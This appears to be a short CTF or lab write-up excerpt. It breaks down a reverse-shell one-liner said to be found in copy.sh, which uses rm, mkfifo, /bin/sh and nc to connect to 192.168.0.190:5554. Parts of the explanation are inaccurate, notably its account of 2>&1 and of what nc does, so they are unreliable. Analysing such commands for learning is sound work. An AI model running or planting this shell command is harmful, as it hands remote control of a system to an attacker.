->Code present in copy.sh: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
(->rm /tmp/f: Removing the f file
(->mkfifo /tmp/f: Making a new fifo(special file) file f
(->cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f: Reading the file f and providing it as an input to the /bin/sh file. The 2>&1 are special characters that don't provide it's output as an input to the command after |. Thereafter, the through the nc command, whatever command we right on the provided port, we are storing in the f file.)
